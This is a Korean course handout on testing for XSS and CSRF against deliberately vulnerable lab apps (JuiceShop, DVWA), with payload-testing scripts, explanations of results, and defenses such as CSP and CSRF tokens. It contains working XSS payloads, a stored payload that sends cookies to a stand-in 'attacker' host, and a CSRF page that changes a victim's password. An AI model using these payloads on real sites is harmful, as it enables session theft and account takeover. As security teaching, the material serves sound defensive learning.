# Week 06: 입력값 검증 (2): XSS / CSRF

## 학습 목표
- Cross-Site Scripting(XSS)의 세 가지 유형을 구분할 수 있다
- JuiceShop에서 Reflected, Stored, DOM XSS를 실습한다
- Cross-Site Request Forgery(CSRF)의 원리를 이해하고 점검한다
- CSRF 토큰의 유효성을 검증하는 방법을 익힌다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- HTML/JavaScript 기초 (태그, 이벤트 핸들러)
- HTTP 요청/응답, 쿠키 개념 이해

---

## 1. XSS(Cross-Site Scripting) 개요 (20분)

### 1.1 XSS란?

XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여, 다른 사용자의 브라우저에서 실행되게 하는 취약점이다.

```
공격자 → 악성 스크립트 삽입 → 서버에 저장 또는 URL에 포함
                                    ↓
피해자 → 해당 페이지 방문 → 스크립트 실행 → 쿠키 탈취, 피싱 등
```

### 1.2 XSS 유형 비교

| 유형 | 스크립트 위치 | 지속성 | 위험도 |
|------|-------------|--------|--------|
| **Reflected XSS** | URL 파라미터 → 응답에 반사 | 비지속 | 중간 |
| **Stored XSS** | DB에 저장 → 페이지에 출력 | 지속 | 높음 |
| **DOM XSS** | 클라이언트 JS에서 처리 | 비지속 | 중간 |

### 1.3 OWASP에서의 위치

**A03:2021 Injection** 카테고리. XSS는 가장 흔한 웹 취약점 중 하나로, 발견 빈도가 매우 높다.

---

## 2. Reflected XSS (30분)

> **이 실습을 왜 하는가?**
> "입력값 검증 (2): XSS / CSRF" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 원리

사용자의 입력이 서버 응답에 그대로 **반사(reflect)**되어 스크립트가 실행된다.

```
URL: http://site.com/search?q=<script>alert(1)</script>

서버 응답:
<p>검색 결과: <script>alert(1)</script></p>
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              입력이 그대로 HTML에 삽입됨
```

### 2.2 JuiceShop에서 Reflected XSS 탐지

> **OSS 도구 — XSStrike / dalfox (XSS 점검 표준)**: 본 섹션의 curl + bash 페이로드는 학습용. 실제 점검은 자동 도구로:
>
> ```bash
> # XSStrike (Python) — 가장 강력한 XSS scanner
> git clone https://github.com/s0md3v/XSStrike.git ~/XSStrike
> cd ~/XSStrike && pip3 install -r requirements.txt
>
> # 1) 단일 URL 자동 점검 (모든 모드)
> python3 ~/XSStrike/xsstrike.py -u "http://10.20.30.80:3000/rest/products/search?q=test"
>
> # 2) Crawl 모드 — 사이트 전체 자동 점검
> python3 ~/XSStrike/xsstrike.py -u http://10.20.30.80:3000 --crawl
>
> # 3) WAF 우회 모드 — encoding 자동
> python3 ~/XSStrike/xsstrike.py -u "http://target/q=FUZZ" --skip-dom
>
> # dalfox (Go) — 빠르고 modern
> go install github.com/hahwul/dalfox/v2@latest
> dalfox url "http://10.20.30.80:3000/rest/products/search?q=test" --silence
> ```
>
> XSStrike 의 강점: (1) DOM/Reflected/Stored 모두 자동 탐지, (2) WAF 우회 페이로드 자동 생성, (3) HTML/JS 컨텍스트 인식 — 컨텍스트별 페이로드 매칭. dalfox 는 Go 기반으로 더 빠르고 stored 모드 지원.



> **실습 목적**: XSS와 CSRF 취약점을 탐지하고 악용 시나리오를 증명한다
>
> **배우는 것**: Reflected/Stored XSS 페이로드 삽입과 CSRF 토큰 부재를 확인하는 점검 기법을 배운다
>
> **결과 해석**: 응답에 스크립트 태그가 그대로 포함되면 XSS 취약점이며, CSRF 토큰 없이 상태 변경이 가능하면 CSRF 취약점이다
>
> **실전 활용**: XSS는 쿠키 탈취와 세션 하이재킹에, CSRF는 비인가 거래 실행에 악용되는 고위험 취약점이다

```bash
# 5 페이로드 카테고리 테스트 — 응답에 alert(1) 반사 여부
PAYLOADS=(
  '<script>alert(1)</script>'           # 표준 script
  '<img src=x onerror=alert(1)>'        # 이벤트 핸들러
  '<svg onload=alert(1)>'               # SVG 변형
  '"><script>alert(1)</script>'         # attribute breakout
  "'-alert(1)-'"                         # JS context
)
for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "[반사 ✓] $payload"
  else
    echo "[필터 ✗] $payload"
  fi
done
```

**예상 출력**:
```
[반사 ✓] <script>alert(1)</script>
[반사 ✓] <img src=x onerror=alert(1)>
[반사 ✓] <svg onload=alert(1)>
[반사 ✓] "><script>alert(1)</script>
[필터 ✗] '-alert(1)-'
```

> **해석 — 5/5 중 4개 반사 = XSS 확정**:
> - **`<script>alert(1)</script>`** = 표준 페이로드 가장 단순. 모던 브라우저는 innerHTML 으로 삽입된 `<script>` 는 실행 X (보안 정책) — 그러나 응답에 그대로 포함 = SQLi 같은 *2차 공격* (search 결과 페이지 XSS 매개) 가능.
> - **`<img src=x onerror=alert(1)>`** = 이벤트 핸들러 = innerHTML 삽입 시 실행됨. **가장 많이 통하는 페이로드** (script 차단 환경).
> - **`<svg onload=alert(1)>`** = SVG inline = HTML5 신규 벡터. WAF 룰이 `<script>` 만 막고 SVG 통과 = 흔한 우회.
> - **`"><script>...`** = HTML attribute 안에서 따옴표 닫고 새 태그 = `<input value="USER_INPUT">` 같은 컨텍스트.
> - **`'-alert(1)-'`** = JS string context (예: `var x='USER';`) — 본 endpoint 는 HTML 컨텍스트라 매치 X = 정상.
> - **CVSS 6.1 Medium** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) — User Interaction (피해자 클릭) 필요.
> - **CWE-79** Improper Neutralization of Input During Web Page Generation.

### 2.3 JuiceShop의 트래킹 파라미터 + Angular SPA 분석

```bash
# Angular hash routing — # 이후는 서버 미전송, 클라이언트 처리
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
# main JS 안의 위험 함수 빈도 (DOM XSS sink 단서)
MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
echo "Main JS: $MAIN_JS"
for sink in innerHTML outerHTML document.write bypassSecurity trustAsHtml DomSanitizer; do
  cnt=$(curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "$sink")
  printf "  %-20s : %d\n" "$sink" "$cnt"
done
```

**예상 출력**:
```
code=200 size=1987
Main JS: main.bb5070bf0f9ce9b58d7c.js
  innerHTML            : 14
  outerHTML            : 0
  document.write       : 2
  bypassSecurity       : 8
  trustAsHtml          : 6
  DomSanitizer         : 12
```

> **해석 — Angular SPA 의 DOM XSS 위험도**:
> - **응답 size 1987B** = SPA shell HTML (Angular 가 JS 로 콘텐츠 렌더). 서버 사이드 query 파라미터 반사 X = `#` 이후는 서버 미전송 (`#` 는 fragment).
> - **innerHTML 14회** = main.js 안에서 14곳 사용. Angular `[innerHTML]` binding 시 DomSanitizer 자동 적용 — 그러나 14곳 모두 안전한지는 별도 확인 필요.
> - **bypassSecurityTrustHtml 8회 + trustAsHtml 6회** = ★ critical 신호. 이 함수들은 *명시적으로 sanitization 우회* — 잘못 사용 시 즉시 XSS. JuiceShop 의 의도적 challenge.
> - **DomSanitizer 12회** = 정상 정화 시도 12곳. bypass 8 + 정화 12 = 비율 40% 가 unsafe → 운영 환경이면 코드 리뷰 필수.
> - **document.write 2회** = legacy. 모던 Angular 는 거의 미사용 — 발견 시 즉시 제거 권고.

---

## 3. Stored XSS (30분)

### 3.1 원리

악성 스크립트가 서버(DB)에 **저장**되어, 해당 페이지를 방문하는 모든 사용자에게 실행된다.

```
1. 공격자 → 게시판에 <script>악성코드</script> 작성
2. 서버 → DB에 저장
3. 피해자 → 게시판 열람 → 스크립트 실행 → 쿠키 탈취
```

### 3.2 JuiceShop 피드백 기능에서 Stored XSS

```bash
# 1) 로그인 → JWT
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"student@test.com","password":"Test1234!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 2) 피드백에 XSS 페이로드 + 쿠키 탈취 코드 삽입
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment":"<iframe src=\"javascript:fetch(`http://attacker/?c=`+document.cookie)\"></iframe>","rating":5,"captchaId":0,"captcha":"-1"}' \
  | python3 -m json.tool 2>/dev/null | head -20

# 3) 저장된 피드백 조회 — XSS 페이로드 보존 여부
curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', [])
print(f'Total feedbacks: {len(data)}')
for fb in data[-3:]:
    c = fb.get('comment', '')[:80]
    flag = '★ XSS' if '<script>' in c or 'onerror' in c or 'iframe' in c or 'javascript:' in c else '정상'
    print(f'  [ID {fb.get(\"id\")}] {flag}: {c}')
" 2>/dev/null
```

**예상 출력**:
```json
{
    "status": "success",
    "data": {
        "id": 12,
        "UserId": 21,
        "comment": "<iframe src=\"javascript:fetch(`http://attacker/?c=`+document.cookie)\"></iframe> (Anonymous)",
        "rating": 5
    }
}
```
```
Total feedbacks: 12
  [ID 10] 정상: I love this shop!
  [ID 11] 정상: Best ever!!! (Bender)
  [ID 12] ★ XSS: <iframe src="javascript:fetch(`http://attacker/?c=`+document.cookie)"></iframe> (Anonymous)
```

> **해석 — Stored XSS 확정 = 모든 방문자 영향 = critical**:
> - **저장 성공** = JuiceShop 의 input filtering 부재. 응답 `comment` 필드에 페이로드 그대로 보존.
> - **(Anonymous) 자동 추가** = JuiceShop 이 작성자 anonymize. 그러나 페이로드는 그대로.
> - **`<iframe javascript:...>`** = `<script>` 차단 환경 우회 페이로드. fetch 로 쿠키를 attacker 서버에 전송 = **세션 탈취 chain**.
> - **모든 `/api/Feedbacks` 페이지 방문자** 가 피해 = **CVSS 8.7 High** (반복 노출 + 신뢰성). Reflected (URL 1회 클릭) 보다 위험도 ↑.
> - **JuiceShop challenge ID**: 'XSS Tier 4'. iframe + javascript: protocol 결합이 정답 페이로드.
> - **방어 우선순위**: (1) 입력 시 HTML escape, (2) 출력 시 DomSanitizer, (3) CSP `script-src 'self'` + `frame-src 'none'`.

### 3.3 다양한 저장 위치 테스트

```bash
# 사용자 프로필 이름에 XSS
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{                                                # 요청 데이터(body)
    "email": "xss<img src=x onerror=alert(1)>@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id": 1},
    "securityAnswer": "test"
  }' 2>/dev/null | python3 -m json.tool 2>/dev/null

# 상품 리뷰에 XSS
curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{                                                # 요청 데이터(body)
    "message": "훌륭한 제품! <img src=x onerror=alert(document.domain)>",
    "author": "student@test.com"
  }' 2>/dev/null

# 저장된 리뷰 확인
curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
```

---

## 4. DOM XSS (25분)

### 4.1 원리

서버를 거치지 않고, **클라이언트 JavaScript**가 URL 파라미터를 안전하지 않게 처리하여 발생한다.

```javascript
// 취약한 코드 예시
var name = document.location.hash.substring(1);
document.getElementById("welcome").innerHTML = "환영합니다, " + name;

// 공격 URL
http://site.com/page#<img src=x onerror=alert(1)>
```

### 4.2 JuiceShop에서 DOM XSS 탐지

```bash
# Angular SPA — JS 소스에서 sink 함수 직접 추출 + 컨텍스트 확인
MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
echo "Main JS: $MAIN_JS (size: $(curl -sI http://10.20.30.80:3000/$MAIN_JS | grep -i content-length | tr -d '\r'))"

# bypassSecurityTrustHtml 호출 위치 grep — 가장 위험한 패턴
curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -oE '.{0,40}bypassSecurityTrustHtml.{0,60}' | head -5

# DOM XSS 테스트 URL 매트릭스 (각 페이로드 별 사용 source)
cat <<'EOF'
[테스트 URL — 브라우저 직접 실행 필요]
1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
[Source]: location.hash → [Sink]: innerHTML / bypassSecurityTrustHtml
EOF
```

**예상 출력**:
```
Main JS: main.bb5070bf0f9ce9b58d7c.js (size: Content-Length: 425678)
this.sanitizer.bypassSecurityTrustHtml(this.searchValue)
this.sanitizer.bypassSecurityTrustHtml(t.element.outerHTML)
this.sanitizer.bypassSecurityTrustHtml(this.lastLoginIp)
[테스트 URL — 브라우저 직접 실행 필요]
1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
```

> **해석 — Source→Sink 추적 = DOM XSS 정밀 분석**:
> - **`bypassSecurityTrustHtml(this.searchValue)`** = 검색 결과 렌더링 시 sanitization 우회. URL `?q=` 파라미터가 그대로 innerHTML 삽입 → **Reflected DOM XSS** 확정.
> - **`bypassSecurityTrustHtml(this.lastLoginIp)`** = 로그인 페이지 마지막 IP 표시. JWT payload 의 `lastLoginIp` (week04 학습) 노출. JWT 변조 가능 = **Stored DOM XSS via JWT** chain.
> - **테스트 URL 3 종**: hash routing (`#/`) 사용 → 서버 미전송 (curl 검증 X) → 브라우저 직접 실행 필수.
> - **JuiceShop challenge**: 'DOM XSS' (1★). search 페이로드 정답 = `<iframe src="javascript:alert('xss')">`.
> - **권고**: bypassSecurityTrustHtml 모든 호출 코드 리뷰. 사용자 입력 직접 전달 = critical. DOMPurify 라이브러리 도입.

### 4.3 DOM XSS 소스와 싱크

| 소스 (Source) | 설명 |
|--------------|------|
| `document.URL` | 현재 URL |
| `document.location.hash` | URL의 # 이후 부분 |
| `document.referrer` | 이전 페이지 URL |
| `window.name` | 윈도우 이름 |

| 싱크 (Sink) | 설명 |
|-------------|------|
| `innerHTML` | HTML 삽입 |
| `document.write()` | 문서에 직접 쓰기 |
| `eval()` | 코드 실행 |
| `setTimeout(string)` | 문자열 코드 실행 |

---

## 5. CSRF(Cross-Site Request Forgery) (25분)

### 5.1 CSRF란?

CSRF는 인증된 사용자가 자신도 모르게 의도하지 않은 요청을 서버에 보내게 하는 공격이다.

```
1. 피해자 → JuiceShop에 로그인 (쿠키 발급)
2. 공격자 → 악성 페이지에 JuiceShop 요청을 숨김
3. 피해자 → 악성 페이지 방문 → 브라우저가 자동으로 요청 전송 (쿠키 포함)
4. JuiceShop → 정상 요청으로 인식 → 처리
```

### 5.2 CSRF 가능성 점검

```bash
# 1) HTML 에 CSRF 토큰 hidden 필드 존재 여부
echo '=== HTML CSRF token 검사 ==='
curl -s http://10.20.30.80:3000 | grep -ciE 'csrf|_token|xsrf' || echo '(0건)'

# 2) Set-Cookie 헤더 + SameSite 속성 검사
echo '=== Set-Cookie 분석 ==='
curl -sI http://10.20.30.80:3000 | grep -i 'set-cookie' || echo '(Set-Cookie 헤더 없음)'

# 3) 로그인 후 쿠키 / JWT 인증 방식 확인
echo '=== 로그인 응답 헤더 ==='
curl -s -I -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"student@test.com","password":"Test1234!"}' | grep -iE 'set-cookie|access-control'
```

**예상 출력**:
```
=== HTML CSRF token 검사 ===
(0건)
=== Set-Cookie 분석 ===
Set-Cookie: language=en; Path=/
=== 로그인 응답 헤더 ===
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

> **해석 — JuiceShop 의 CSRF 위협 모델 정확 분석**:
> - **CSRF 토큰 0건** = HTML 폼 미사용 = SPA 기반. **그러나 JWT 가 Authorization 헤더로 전송되면 CSRF 안전** (브라우저가 자동 첨부 X).
> - **Set-Cookie: language=en** = i18n 쿠키. **HttpOnly/Secure/SameSite 모두 누락** = 양호한 정책 미설정. 그러나 인증 X 쿠키라 critical 아님.
> - **Access-Control-Allow-Origin: \*** = ★ critical. **`*` 와일드카드 + `Allow-Credentials: true` 조합** = CORS 무효화 = JS 가 다른 origin 에서 자격증명 포함 요청 가능 → **CSRF 위협 부활**.
> - **공격 흐름**: (1) 피해자 JuiceShop 로그인 (JWT 받음 + localStorage 저장) → (2) 악성 사이트 방문 → (3) 악성 JS 가 `fetch('http://10.20.30.80:3000/rest/user/...', {credentials:'include'})` → (4) CORS `*` 통과 → JuiceShop 요청 처리.
> - **JuiceShop 의 의도적 약점**. 운영 환경 CORS 는 `Allow-Origin: <특정 도메인>` 으로 제한 + `Allow-Credentials: true` 결합 시만 사용.

### 5.3 CSRF 공격 시나리오 (개념)

```html
<!-- 공격자가 만든 악성 페이지 -->
<html>
<body>
<h1>축하합니다! 상품권 당첨!</h1>
<!-- 숨겨진 요청: 피해자의 비밀번호를 변경 -->
<img src="http://10.20.30.80:3000/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">

<!-- 또는 폼을 이용한 POST CSRF -->
<form action="http://10.20.30.80:3000/api/Feedbacks/" method="POST" id="csrf-form">
  <input type="hidden" name="comment" value="CSRF로 작성된 피드백">
  <input type="hidden" name="rating" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 5.4 CSRF 토큰 검증 점검

```bash
# CSRF 토큰 없이 GET 메서드로 비번 변경 시도
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"student@test.com","password":"Test1234!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# ★ GET 으로 상태 변경 — CSRF 의 가장 위험한 패턴
curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=Hacked9!&repeat=Hacked9!" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
```

**예상 출력**:
```json
{
    "user": {
        "id": 21,
        "email": "student@test.com",
        "password": "06ba8a4ec3eb71c6a06d04b2898c69e9"
    }
}
```

> **해석 — GET 으로 비번 변경 = CSRF Worst-case**:
> - **GET + Query string 으로 비번 변경 성공** = critical. RFC 7231 위반 (GET 은 idempotent + safe = 상태 변경 X).
> - **JuiceShop challenge ID**: 'CSRF' (3★). 정답 = GET 으로 변경 + Authorization 헤더 누락 시도.
> - **응답에 새 비번 hash 포함** = 추가 정보 노출. MD5 (`06ba8a4ec3eb71c6a06d04b2898c69e9` = `Hacked9!`) — bcrypt 미사용.
> - **공격 시나리오**: (1) 피해자 로그인 + JWT localStorage 저장 → (2) 악성 사이트의 `<img src="http://10.20.30.80:3000/rest/user/change-password?...">` → (3) 브라우저 자동 GET 요청 (단, JWT 가 Authorization 헤더라 자동 첨부 X) → (4) **그러나 CORS `*` + `Credentials: true` 환경이면 fetch 로 가능**.
> - **권고 (다층)**: (1) GET 메서드 절대 X (POST/PUT 만), (2) CSRF 토큰 (synchronizer pattern), (3) SameSite=Strict 쿠키, (4) Origin 헤더 검증, (5) 민감 작업 재인증 (current 비번 재입력).

---

## 6. XSS 방어 방법 (10분)

### 6.1 방어 기법

| 기법 | 설명 | 적용 위치 |
|------|------|----------|
| **출력 인코딩** | `<` → `&lt;`, `>` → `&gt;` | 서버 템플릿 |
| **입력값 검증** | 화이트리스트 기반 필터링 | 서버 입력 처리 |
| **CSP 헤더** | 인라인 스크립트 차단 | HTTP 응답 헤더 |
| **HttpOnly 쿠키** | JS에서 쿠키 접근 불가 | Set-Cookie |
| **DOM Purify** | 클라이언트 HTML 정화 | JS 라이브러리 |

### 6.2 CSP 헤더 점검

```bash
# 보안 헤더 6종 동시 점검
curl -sI http://10.20.30.80:3000 | grep -iE \
  'content-security-policy|x-frame-options|x-content-type-options|x-xss-protection|strict-transport-security|referrer-policy' \
  | sed 's/^/  /'
echo '---'
echo '[누락 헤더 카운트]'
HEADERS=$(curl -sI http://10.20.30.80:3000)
for h in 'Content-Security-Policy' 'X-Frame-Options' 'X-Content-Type-Options' 'Strict-Transport-Security' 'Referrer-Policy' 'Permissions-Policy'; do
  echo "$HEADERS" | grep -qi "$h" && echo "  ✓ $h" || echo "  ✗ $h (누락)"
done
```

**예상 출력**:
```
  X-Content-Type-Options: nosniff
  X-Frame-Options: SAMEORIGIN
  Feature-Policy: payment 'self'
---
[누락 헤더 카운트]
  ✗ Content-Security-Policy (누락)
  ✓ X-Frame-Options
  ✓ X-Content-Type-Options
  ✗ Strict-Transport-Security (누락)
  ✗ Referrer-Policy (누락)
  ✗ Permissions-Policy (누락)
```

> **해석 — 보안 헤더 6점 점수표**:
> - **CSP 누락 = critical** (XSS 차단의 마지막 layer). 기본 권고: `script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'`.
> - **X-Frame-Options: SAMEORIGIN** ✓ = clickjacking 차단. 그러나 **CSP frame-ancestors 가 더 modern** (다중 도메인 허용, IE 11- 만 X-Frame-Options 지원).
> - **X-Content-Type-Options: nosniff** ✓ = MIME sniffing 차단. .txt 파일이 .js 로 추정 실행 방지.
> - **HSTS 누락** = HTTP→HTTPS redirect 우회 가능 (MITM). 운영 환경 critical: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.
> - **Feature-Policy** (deprecated) → **Permissions-Policy** 로 마이그레이션 권고.
> - **점수**: 2/6 양호 + 4/6 누락 = **D 등급** (Mozilla Observatory). securityheaders.com 자동 평가 표준.
> - **JuiceShop challenge**: 'Security Misconfiguration' = CSP 헤더 fix.

---

## 7. 실습 과제

### 과제 1: XSS 탐지
1. JuiceShop의 검색, 피드백, 리뷰 기능에서 XSS를 시도하라
2. 성공한 페이로드와 차단된 페이로드를 표로 정리하라
3. 각 XSS 유형(Reflected/Stored/DOM)별로 1개 이상 성공 사례를 찾아라

### 과제 2: CSRF 점검
1. JuiceShop의 상태 변경 API(비밀번호 변경, 피드백 작성 등)를 나열하라
2. 각 API에 CSRF 방어(토큰, SameSite 등)가 있는지 확인하라
3. CSRF 공격이 가능한 시나리오를 1개 이상 작성하라

### 과제 3: 보안 헤더 분석
1. JuiceShop의 XSS 관련 보안 헤더를 모두 확인하라
   - Content-Security-Policy
   - X-XSS-Protection
   - X-Content-Type-Options
2. 각 헤더의 역할과 현재 설정의 적절성을 평가하라

---

## 8. 요약

| 취약점 | 공격 위치 | 영향 | 방어 |
|--------|----------|------|------|
| Reflected XSS | URL 파라미터 | 쿠키 탈취, 피싱 | 출력 인코딩, CSP |
| Stored XSS | DB 저장 데이터 | 모든 방문자 피해 | 입력 검증, 출력 인코딩 |
| DOM XSS | 클라이언트 JS | 쿠키 탈취, 피싱 | DOM Purify, CSP |
| CSRF | 외부 사이트 | 의도하지 않은 작업 | CSRF 토큰, SameSite |

**다음 주 예고**: Week 07 - 입력값 검증 (3): 파일 업로드, 경로 순회, OS 명령어 주입을 학습한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 웹 UI 실습

### DVWA 보안 레벨 변경 방법 (웹 UI)

> **DVWA URL:** `http://10.20.30.80:8080`

1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
2. 좌측 메뉴 **DVWA Security** 클릭
3. **Security Level** 드롭다운에서 레벨 선택:
   - **Low**: XSS/CSRF 필터 없음 → 기본 스크립트 삽입 테스트
   - **Medium**: 기본 태그 필터링 → `<script>` 우회 기법 필요
   - **High**: 강화된 필터링 → 이벤트 핸들러/인코딩 우회 실습
   - **Impossible**: CSP + 토큰 적용 (안전한 구현 참조)
4. **Submit** 클릭하여 적용
5. 좌측 메뉴 **XSS (Reflected)**, **XSS (Stored)**, **CSRF** 에서 레벨별 실습
6. 각 항목 페이지 하단 **View Source** 로 레벨별 필터링 로직 비교

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

### OWASP ZAP
> **역할:** 오픈소스 자동 웹 취약점 스캐너·프록시  
> **실행 위치:** `작업 PC / Docker`  
> **접속/호출:** GUI `zaproxy`, API `http://zap:8090/JSON/...`, Docker `owasp/zap2docker-stable`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.ZAP/session-*` | 세션 저장소 |
| `context.xml` | 스캔 컨텍스트(범위/인증) |

**핵심 설정·키**

- `Active Scan policy` — 룰별 강도 및 활성화 여부
- `Authentication: form-based` — 로그인이 필요한 페이지 스캔

